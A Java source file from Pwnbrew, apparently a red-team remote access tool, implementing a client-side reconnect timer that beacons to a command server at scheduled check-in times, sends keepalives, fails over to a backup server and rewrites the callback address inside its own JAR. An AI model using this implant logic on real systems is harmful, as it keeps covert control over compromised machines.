/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  ReconnectTimer.java
 *
 *  Created on June 7, 2013
 */

package pwnbrew.utilities;

import java.io.IOException;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.Message;
import pwnbrew.network.ReconnectCallback;
import pwnbrew.network.control.messages.NoOp;
import pwnbrew.selector.SocketChannelHandler;

/**
 *
 *  
 */
public class ReconnectTimer extends ManagedRunnable {
    
    private final PortManager theCommManager;
    private Message postConnectMsg = null;
    
    //Static instance
    private final Queue<String> theReconnectTimeList = new LinkedList<>();    
//    private int lockVal = 0;
    
    private static final String NAME_Class = ReconnectTimer.class.getSimpleName();
    private String backupServerIp = null;
    private int backupServerPort = -1;
    
    private final int theChannelId;
           

    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedManager
     * @param channelId
    */
    public ReconnectTimer( PortManager passedManager, int channelId ) {
        super(Constants.Executor);
        theCommManager = passedManager;
        theChannelId = channelId;
    }
    
    // ==========================================================================
    /**
     *   Sets the message to be queued after connection
     * @param passedMsg
    */
    public synchronized void setPostConnectMessage( Message passedMsg ) {

        postConnectMsg = passedMsg;  
        
    }
    
     // ==========================================================================
    /**
     *   Sets the IP address for the backup server
     * @param passedIp
    */
    public synchronized void setBackupServerIp( String passedIp ) {

        backupServerIp = passedIp;  
        
    }/* END setBackupServerIp() */
    
       // ==========================================================================
    /**
     *   Sets the IP address for the backup server
     * @param passedPort
    */
    public synchronized void setBackupServerPort( int passedPort ) {

        backupServerPort = passedPort;  
        
    }/* END setBackupServerPort() */
     
    // ==========================================================================
    /**
     *  Main thread loop
     *
    */
    @Override
    public void go() {
        
        int connected = 0;
              
        DebugPrinter.printMessage(NAME_Class, "ReconnectTimer started for channel " + Integer.toString(theChannelId));
        //Get the socket router
        ClientConfig theConf = ClientConfig.getConfig();
        String serverIp = theConf.getServerIp();
        int thePort = ClientConfig.getConfig().getSocketPort();
        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
        
        //Create the connection callback
        ReconnectCallback theCC = new ReconnectCallback(serverIp, thePort, this);        
        if(aPR == null){
            DebugPrinter.printMessage(NAME_Class, "No port router. Aborting.");
            return;     
        }      
        
        //Set the reconnect timer
        aPR.getConnectionManager().setReconnectTimer( theChannelId, this );
        try {                 
            
            Calendar theCalendar = Calendar.getInstance(); 
            theCalendar.setTime( new Date() );
            theCalendar.add(Calendar.SECOND, 5 );
            Date theDate = theCalendar.getTime();
            
            while( connected == 0 && !shutdownRequested ){
            
                String reconnectTime;
                synchronized(theReconnectTimeList){
                    reconnectTime = theReconnectTimeList.poll();
                }
                
                //Get the reconnect time from the list
                if( reconnectTime != null ){

                    try {
                        theDate = Constants.CHECKIN_DATE_FORMAT.parse( reconnectTime ); 
                    } catch (NumberFormatException ex ){
                        ex = null;
                        continue;
                    } 
                    
                    //check if the time is before now
                    Calendar anotherCalendar = Calendar.getInstance(); 
                    anotherCalendar.setTime( theDate );
                    if( anotherCalendar.before( new Date())){                        
                        //Initialize the time
                        continue;                   
                    }                   
                    
                }        
            
                //Wait till a certain time
                if( theDate != null ){
                    
                    waitUntil(theDate);  
                    aPR.ensureConnectivity( theCC, theChannelId );
                    //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer waiting to be notified.");
                    waitToBeNotified();
                    
                    //Queue post connect msg if it exists
                    if( postConnectMsg != null){
                        DataManager.send( theCommManager, postConnectMsg );
                        postConnectMsg = null;
                    }
                    
                    //Get the channel id
                    connected = theCC.getChannelId();
                    //DebugPrinter.printMessage(NAME_Class, "ReconnectTimer notified. Connected: " + connected);
                    theDate = null;
                    
                    //Send & Receive message
                    SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(connected);
                    if( aSCH != null ){
                        if(aSCH.getQueueSize() == 0 ){
                            NoOp aNoOp = new NoOp();
                            aNoOp.setChannelId(connected);
                            DataManager.send( theCommManager, aNoOp);    
                        }
                        aSCH.signalSend();
                    } else {
                        DebugPrinter.printMessage(NAME_Class, "SocketChannelHandler is null");
                        connected = 0;
                    }
                   
                } else  {
                    break;
                }
                
            }
            
        } catch (ParseException ex) {
            RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
        }
        
        //Check if there is an alternate server IP/Port
        if( backupServerIp != null && backupServerPort != -1 ){

            theCC = new ReconnectCallback(backupServerIp, backupServerPort, this); 
            aPR.ensureConnectivity(theCC, theChannelId);
            waitToBeNotified();

            //Get the channel id
            connected = theCC.getChannelId();
            if( connected != 0 ){

                theConf.setServerIp(backupServerIp);
                theConf.setSocketPort( Integer.toString( backupServerPort ));

                try {
                    //Set JAR conf back to old IP
                    Utilities.updateServerInfoInJar(backupServerIp +":"+ Integer.toString( backupServerPort));
                } catch (ClassNotFoundException | IOException ex) {
                    RemoteLog.log(Level.SEVERE, NAME_Class, "go()", ex.getMessage(), ex);
                }

                //Reset things
                theReconnectTimeList.clear();
                backupServerIp = null;
                backupServerPort = -1;
                return;
            }               
        }
     
        //Reset things
        theReconnectTimeList.clear();
        backupServerIp = null;
        backupServerPort = -1;
        
    }
    
    // ==========================================================================
    /**
     *  Wait until a certain date to reconnect
     * 
     * @param date 
     */
    private void waitUntil(Date date) {
        
        final Object syncedObject = new Object();
        TimerTask aTimerTask = new TimerTask() {
            @Override
            public void run() {
                synchronized (syncedObject) {
                    syncedObject.notify();
                }
            }
        };
        
        //DebugPrinter.printMessage(NAME_Class, "Trying to connect again at " + date.toString());
        //Create a timer
        Timer aTimer = new Timer();
        aTimer.schedule(aTimerTask, date);
        synchronized(syncedObject) {
            try {
                syncedObject.wait();
            } catch (InterruptedException ie) {}
        }
        aTimer.cancel();
        aTimer.purge();
    }

    // ==========================================================================
    /**
     *  Sets the delay to wait before trying to connect.
     * 
     * @param passedTime 
    */
    public void addReconnectTime( String passedTime ) {
        synchronized(theReconnectTimeList){
            theReconnectTimeList.add( passedTime );
        }
    }
  
    //===============================================================
    /**
     * 
     */
    public void clearTimes() {
        synchronized(theReconnectTimeList){
            theReconnectTimeList.clear();
        }
    }

}
